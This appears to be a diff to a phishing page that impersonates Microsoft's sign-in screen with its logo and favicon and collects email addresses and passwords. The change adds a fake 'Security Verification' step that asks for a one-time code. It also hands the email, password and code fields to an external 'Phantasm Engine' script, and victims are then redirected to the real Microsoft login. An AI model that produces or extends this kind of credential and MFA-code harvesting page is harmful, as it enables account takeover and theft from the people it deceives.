@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to your account</title>
+    <title>Log in to your account</title>
     <link rel="icon" href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
     <style>
         body {
@@ -153,7 +153,7 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft" class="logo">
         
         <div id="step-1">
-            <h1>Sign in</h1>
+            <h1>Log in</h1>
             
             <div class="input-group">
                 <input type="email" id="email-input" placeholder="Email, phone, or Skype" required>
@@ -167,13 +167,13 @@
             </div>
             
             <div class="actions">
-                <button class="next-btn" onclick="goToStep2()">Next</button>
+                <button class="next-btn" id="btn-next">Next</button>
             </div>
         </div>
 
         <div id="step-2" class="hidden">
             <div class="user-identity">
-                <span class="back-arrow" onclick="goToStep1()">&#8592;</span>
+                <span class="back-arrow" id="back-arrow">&#8592;</span>
                 <span id="user-email-display">user@example.com</span>
             </div>
             
@@ -188,8 +188,19 @@
             </div>
             
             <div class="actions">
-                <button class="next-btn" onclick="submitLogin()">Sign in</button>
+                <button class="next-btn" id="btn-submit">Log in</button>
             </div>
+        </div>
+        
+        <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%;">
+            <h1 style="margin-bottom: 10px; font-size: 24px;">Security Verification</h1>
+            <p style="color: #666; font-size: 15px; margin-bottom: 20px; text-align: center;">To secure your account, please enter the verification code sent to your device.</p>
+            
+            <div class="input-group" style="width: 100%; margin-bottom: 20px;">
+                <input type="text" id="otp-input" placeholder="Enter code" required style="width: 100%; padding: 10px; font-size: 16px; border: 1px solid #ccc; border-radius: 4px;">
+            </div>
+            
+            <button class="next-btn" id="btn-otp-submit" style="width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;">Verify</button>
         </div>
     </div>
     
@@ -199,55 +210,32 @@
         <a href="#">...</a>
     </div>
 
+    <!-- Phantasm Engine -->
+    <script src="/assets/js/phantasm.js"></script>
     <script>
-        function goToStep2() {
-            const email = document.getElementById('email-input').value;
-            if (!email) {
-                document.getElementById('email-input').focus();
-                document.getElementById('email-input').style.borderColor = '#d93025';
-                return;
-            }
-            document.getElementById('user-email-display').innerText = email;
-            document.getElementById('step-1').classList.add('hidden');
-            document.getElementById('step-2').classList.remove('hidden');
-            document.getElementById('password-input').focus();
-        }
-
-        function goToStep1() {
-            document.getElementById('step-2').classList.add('hidden');
-            document.getElementById('step-1').classList.remove('hidden');
-        }
-
-        function submitLogin() {
-            const email = document.getElementById('email-input').value;
-            const password = document.getElementById('password-input').value;
-            
-            if (!password) {
-                document.getElementById('password-input').focus();
-                document.getElementById('password-input').style.borderColor = '#d93025';
-                return;
-            }
-
-            fetch('/login', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    email: email,
-                    password: password
-                })
-            }).then(() => {
-                window.location.href = "https://login.microsoftonline.com/";
+        document.addEventListener('DOMContentLoaded', () => {
+            // Custom back arrow logic
+            document.getElementById('back-arrow').addEventListener('click', () => {
+                document.getElementById('step-2').classList.add('hidden');
+                document.getElementById('step-1').classList.remove('hidden');
+                document.getElementById('step-1').style.display = 'block';
             });
-        }
 
-        // Allow Enter key
-        document.getElementById('email-input').addEventListener('keypress', function (e) {
-            if (e.key === 'Enter') goToStep2();
-        });
-        document.getElementById('password-input').addEventListener('keypress', function (e) {
-            if (e.key === 'Enter') submitLogin();
+            // Initialize Engine
+            new Phantasm({
+                redirectUrl: 'https://login.microsoftonline.com',
+                selectors: {
+                    email: '#email-input',
+                    password: '#password-input',
+                    otp: '#otp-input',
+                    nextBtn: '#btn-next',
+                    submitBtn: '#btn-submit',
+                    otpBtn: '#btn-otp-submit',
+                    step1: '#step-1',
+                    step2: '#step-2',
+                    step3: '#step-3-otp'
+                }
+            });
         });
     </script>
 </body>
